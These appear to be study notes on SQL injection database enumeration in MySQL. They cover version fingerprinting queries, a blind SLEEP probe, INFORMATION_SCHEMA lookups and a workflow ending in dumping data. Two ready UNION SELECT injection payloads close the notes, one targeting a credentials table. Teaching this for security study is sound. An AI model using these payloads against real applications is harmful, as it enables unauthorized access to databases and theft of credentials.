## Database Enumeration

**MySQL Fingerprinting Payloads**

| Payload | When to Use | Expected Output | Wrong Output |
| --- | --- | --- | --- |
| `SELECT @@version` | Full query output available | MySQL version (e.g., `10.3.22-MariaDB-1ubuntu1`) | MSSQL returns its version. Other DBMSs return an error. |
| `SELECT POW(1,1)` | Only numeric output available | `1` | Other DBMSs return an error. |
| `SELECT SLEEP(5)` | Blind SQLi / no output | Delays response by 5 seconds and returns `0` | Other DBMSs do not delay the response. |

To extract data using `UNION SELECT`, we need to know: List of databases , List of tables in each database , List of columns in each table. Once we know these, we can query any table in any database. This information is stored in the **INFORMATION_SCHEMA** database. `INFORMATION_SCHEMA` is a special database that stores **metadata** about the server.

- To access a table in another database, use the **dot (`.`) operator : `SELECT * FROM my_database.users;`**

**SCHEMATA Table**

The first step is finding all databases. The table: `INFORMATION_SCHEMA.SCHEMATA` contains information about every database. The column: `SCHEMA_NAME` stores the database names.

- To determine which database the web application is using: `SELECT database();`
- Before extracting data, we need to know which tables exist: `INFORMATION_SCHEMA.TABLES`
- Before dumping data, we must know the column names. The table : `INFORMATION_SCHEMA.COLUMNS`

#### Database Enumeration Workflow

```
1. Fingerprint the DBMS
        ↓
2. Find all databases
        ↓
3. Find the current database
        ↓
4. Find tables in the target database
        ↓
5. Find columns in the target table
        ↓
6. Dump the data
```

- `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`
- `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`
